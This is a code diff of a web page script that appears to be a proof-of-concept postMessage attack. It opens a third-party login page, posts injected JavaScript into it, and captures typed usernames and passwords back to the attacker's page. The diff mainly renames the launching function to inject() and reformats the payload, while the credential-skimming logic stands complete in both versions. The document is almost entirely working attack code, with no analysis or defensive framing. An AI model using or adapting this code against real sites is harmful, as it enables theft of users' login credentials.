@@ -33,15 +33,15 @@
     </div>
 
         <script>
-            function sleep(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-
             document.getElementById("o").addEventListener("click", launch);
-            document.getElementById("i").addEventListener("click", deploy);
+            document.getElementById("i").addEventListener("click", inject);
 
             var script = "";
-            script += 'function send() { console.log("send()"); window.opener.postMessage({ "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, "http://127.0.0.1/") }'
+            script += 'function send() { '
+            script += '     window.opener.postMessage('
+            script += '         { "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, '
+            script += '         "http://127.0.0.1/") '
+            script += ' }'
             script += 'document.getElementById("username").addEventListener("change", send);'
             script += 'document.getElementById("password").addEventListener("change", send);'
 
@@ -51,14 +51,14 @@
                 windowRef = window.open('https://branleys.com/login.html');
             }
 
-            function deploy() {
+            function inject() {
                 windowRef.postMessage(script, "https://branleys.com/");
                 console.log('posted message')
             }
 
             window.addEventListener("message", receiveMessage, false);
             function receiveMessage(event) {
-                console.log('recieved message')
+                console.log(event)
                 document.getElementById("u").innerHTML = event.data.u;
                 document.getElementById("p").innerHTML = event.data.p;
             }
